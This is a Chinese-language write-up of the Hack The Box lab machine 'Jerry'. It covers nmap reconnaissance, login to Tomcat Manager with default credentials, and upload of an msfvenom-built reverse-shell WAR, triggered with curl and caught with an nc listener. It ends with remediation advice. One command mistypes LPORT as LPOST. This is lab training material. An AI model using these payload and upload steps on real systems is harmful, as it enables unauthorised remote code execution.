## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Jerry
2. 難度:Easy
3. IP:10.129.136.9

### 主要發現：
1. 漏洞 ：服務未更改預設的帳號密碼導致攻擊者能直接進入Web應用程式管理員介面。（風險等級：Critical）
2. 漏洞 ：透過不安全的WAR檔案部署機制達成遠端程式碼執行（風險等級：High）

### 攻擊鏈摘要：

利用預設憑證登入管理頁面後，攻擊者利用管理頁面上傳功能上傳了惡意war檔，並且呼叫其中的惡意jsp檔，獲得系統控制權。


### 潛在影響：

1. 未修改預設憑證，導致管理員權限外洩、內部設定被修改。
2. 舊版本公開漏洞使攻擊者可依靠上傳功能獲得系統控制權，造成重要文件外洩、伺服器癱瘓。
3. 服務以SYSTEM權限運行，若服務被劫持，攻擊者可輕易獲得SYSTEM權限，造成系統全面崩潰。

### 修復建議：

1. 立即修改中的預設憑證，並採用強密碼策略。
2. 配置Tomcat服務以低權限帳戶運行，而非預設的系統權限，以防止漏洞利用後的權限擴散。
3. 立即將Tomcat服務更新至最新版本。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.136.9 -oA portscan/tcp
sudo nmap -sT-Pn -sV -sC -O -p8080 10.129.136.9 -oA portscan/detail
sudo nmap -sU --top-ports 20 10.129.136.9 -oA portscan/udp
sudo nmap --script=vuln -p8080 10.129.136.9 -oA portscan/vuln
```

<img width="654" height="240" alt="螢幕擷取畫面 2026-03-27 213048" src="https://github.com/user-attachments/assets/6bdfaeaf-9354-412c-8d06-c928e72a516e" />

<img width="1624" height="402" alt="螢幕擷取畫面 2026-03-27 213102" src="https://github.com/user-attachments/assets/65395f38-1f2f-4852-b58b-a22a455d29ed" />

<img width="607" height="567" alt="螢幕擷取畫面 2026-03-27 213207" src="https://github.com/user-attachments/assets/f955879f-6337-4708-aef1-78424de0422a" />

<img width="794" height="568" alt="螢幕擷取畫面 2026-03-27 215900" src="https://github.com/user-attachments/assets/e3c33dd8-d2df-4c47-9222-24727e2bda3f" />

探索8080

<img width="1132" height="658" alt="螢幕擷取畫面 2026-03-27 213624" src="https://github.com/user-attachments/assets/b04b5ec1-0b36-45f7-bf53-a3df91410bec" />


### 2.2 枚舉(Enumeration)

搜尋預設憑證，很多組都能登入，但只有tomcat/s3cret有執行權限

<img width="1116" height="712" alt="螢幕擷取畫面 2026-03-27 213813" src="https://github.com/user-attachments/assets/e5c5ca9b-e452-43d6-876c-59c8c6944fca" />

<img width="1230" height="693" alt="螢幕擷取畫面 2026-03-27 213907" src="https://github.com/user-attachments/assets/1999b400-d015-4ee4-83b7-d1fb5156fa04" />

使用searchsploit尋找公開漏洞

<img width="1892" height="188" alt="螢幕擷取畫面 2026-03-27 214212" src="https://github.com/user-attachments/assets/d665b955-3e33-478e-ac9a-cd02bb7d1eff" />


### 2.3 初始存取(Initial Access)

檢視利用方式，是呼叫被上傳的惡意JSP檔以達到遠端程式碼執行的漏洞，我將惡意JSP檔包裝成WAR檔後，使用網站功能上傳，再呼叫其中的惡意JSP檔的方式

<img width="1902" height="497" alt="螢幕擷取畫面 2026-03-27 214356" src="https://github.com/user-attachments/assets/7626face-69b3-42b0-9154-932c634aca7c" />

使用msfvenom構造反彈shell payload，若是對相關payload名字不熟的話，可以使用 -l 參數搭配grep篩選
```bash
msfvenom -l payloads | grep java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.90 LPOST=1234 -f war -o shell.war
```

<img width="1550" height="230" alt="螢幕擷取畫面 2026-03-27 215153" src="https://github.com/user-attachments/assets/6d2ba802-a124-4be4-976b-8c7b4df39998" />

<img width="850" height="111" alt="螢幕擷取畫面 2026-03-27 215427" src="https://github.com/user-attachments/assets/2b7f71c7-c7cc-4f9d-8896-33243f171923" />

使用jar工具檢視war內JSP檔名
```bash
jar -tf shell.war
```

<img width="276" height="108" alt="螢幕擷取畫面 2026-03-27 220011" src="https://github.com/user-attachments/assets/7a53cf59-fd7e-453c-b256-1f3eb7a55681" />

使用網頁功能上傳惡意war檔

<img width="462" height="122" alt="螢幕擷取畫面 2026-03-27 220120" src="https://github.com/user-attachments/assets/66cd7dbb-ab29-45d9-926d-1004e3e5e3c2" />

開啟nc監聽
```bash
nc -lvnp 1234
```

<img width="420" height="183" alt="螢幕擷取畫面 2026-03-27 220157" src="https://github.com/user-attachments/assets/d1abc78d-7736-4a34-8175-8035a030087c" />

網站上已經顯示出上傳的惡意檔案了

<img width="1271" height="603" alt="螢幕擷取畫面 2026-03-27 220226" src="https://github.com/user-attachments/assets/e3062231-9b83-472b-9f82-373d76e8d077" />

使用curl呼叫惡意JSP檔案
```bash
curl http://10.129.136.9:8080/shell/fbcymvggy.jsp
```

<img width="511" height="84" alt="螢幕擷取畫面 2026-03-27 220342" src="https://github.com/user-attachments/assets/1af22782-6e79-4be3-90dd-34436197d288" />

獲得反彈shell

<img width="633" height="275" alt="螢幕擷取畫面 2026-03-27 220405" src="https://github.com/user-attachments/assets/8d843cbd-2090-40f5-9f41-e8a85abfd58e" />


### 2.4 最終成果(Impact)

獲得user.txt和root.txt

<img width="715" height="754" alt="螢幕擷取畫面 2026-03-27 220833" src="https://github.com/user-attachments/assets/40a27b18-5ba8-4b7f-9832-11cd0ec505b5" />

---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 這是我玩過最簡單的靶機之一，有點像TryHackMe的練習，我花了大約10分鐘就解完了，我還等了幾分鐘nmap vuln才跑完。
2. 對新手特別友好的靶機，推薦給剛入門的朋友，除了公開漏洞搜尋與利用以外，windows cmd的指令也可以稍微練習到。
3. 公開漏洞的說明是發出POST請求，其實講的有點彎彎繞繞，就是簡單地繞過上傳檔案漏洞而已，理解了就很簡單。


